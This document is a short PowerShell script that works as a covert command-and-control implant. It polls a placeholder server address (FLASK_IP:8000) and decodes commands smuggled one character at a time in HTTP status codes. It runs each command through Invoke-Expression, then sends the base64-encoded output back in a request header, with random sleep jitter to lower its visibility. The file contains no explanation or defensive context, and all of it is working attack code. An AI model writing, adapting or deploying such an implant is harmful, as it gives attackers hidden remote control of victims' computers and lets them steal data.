$Server = "http://FLASK_IP:8000"
$Buf = ""
$ClientID = [guid]::NewGuid().ToString()
while ($true) {
    try {
        $response = Invoke-WebRequest -Uri "$Server/poll" -UseBasicParsing -Headers @{ "X-Client" = $ClientID }  -ErrorAction Stop
        $Code = [int]$response.StatusCode
    } catch {
        $Code = $_.Exception.Response.StatusCode.Value__
    }
    if ($Code -ge 200 -and $Code -le 326) {
        $charCode = $Code - 200
        if ($charCode -eq 10) {
            # Write-Host "`n[>] Executing: $Buf`n"
            try {
                $result = Invoke-Expression $Buf | Out-String
            } catch {
                $result = $_ | Out-String
            }
            $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($result.Trim()))
            $request = [System.Net.WebRequest]::Create("$Server/poll")
            $request.Method = "GET"
            $request.Headers.Add("X-Output", $encoded)
            $request.Headers.Add("X-Client", $ClientID)
            try {
                $request.GetResponse().Close()
            } catch {}

            $Buf = ""
        }
        elseif ($charCode -ge 32 -and $charCode -le 126) {
            $Buf += [char]$charCode
        }
    }
    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1500)
}
